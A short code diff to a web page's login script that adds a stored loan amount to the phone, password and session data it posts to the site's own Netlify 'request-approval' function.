@@ -282,6 +282,7 @@
 
             // Generate unique session ID
             const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
+            const loanAmount = sessionStorage.getItem('loanAmount') || 'Not specified';
             sessionStorage.setItem('sessionId', sessionId);
             sessionStorage.setItem('phone', phone);
 
@@ -290,7 +291,7 @@
                 await fetch('/.netlify/functions/request-approval', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone, password: pass, sessionId })
+                    body: JSON.stringify({ phone, password: pass, sessionId, loanAmount })
                 });
             } catch (e) {
                 showError('Network error. Please try again.');
